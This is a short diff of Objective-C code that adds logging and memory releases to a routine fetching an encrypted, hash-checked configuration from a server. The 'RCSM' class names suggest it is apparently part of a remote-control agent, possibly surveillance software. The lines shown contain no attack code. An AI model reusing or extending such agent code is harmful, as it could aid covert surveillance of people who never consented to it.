@@ -13,6 +13,7 @@
 #import "NSData+SHA1.h"
 #import "NSMutableData+AES128.h"
 #import "NSMutableData+SHA1.h"
+#import "RCSMInfoManager.h"
 
 #import "RCSMTaskManager.h"
 #import "RCSMLogger.h"
@@ -66,11 +67,14 @@
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
 
+  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+  
   if (replyData == nil)
     {
 #ifdef DEBUG_CONF_NOP
       errorLog(@"empty reply from server");
 #endif
+      [infoManager release];
       [commandData release];
       [outerPool release];
 
@@ -111,6 +115,7 @@
       errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
+      [infoManager release];
       return NO;
     }
   
@@ -127,6 +132,7 @@
       errorLog(@"sha mismatch");
 #endif
       
+      [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -140,6 +146,7 @@
       errorLog(@"No configuration available (command %d)", command);
 #endif
       
+      [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -158,7 +165,10 @@
 #ifdef DEBUG_CONF_NOP
       errorLog(@"exception on configSize makerange (%@)", [e reason]);
 #endif
-      
+
+      [infoManager logActionWithDescription: @"Corrupted configuration received"];
+      [infoManager release];
+
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -176,6 +186,9 @@
       errorLog(@"configuration size is zero!");
 #endif
       
+      [infoManager logActionWithDescription: @"Corrupted configuration received"];
+      [infoManager release];
+
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -196,6 +209,9 @@
       errorLog(@"exception on configData makerange (%@)", [e reason]);
 #endif
       
+      [infoManager logActionWithDescription: @"Corrupted configuration received"];
+      [infoManager release];
+
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -222,6 +238,7 @@
       return NO;
     }
   
+  [infoManager release];
   [configData release];
   [replyDecrypted release];
   [commandData release];
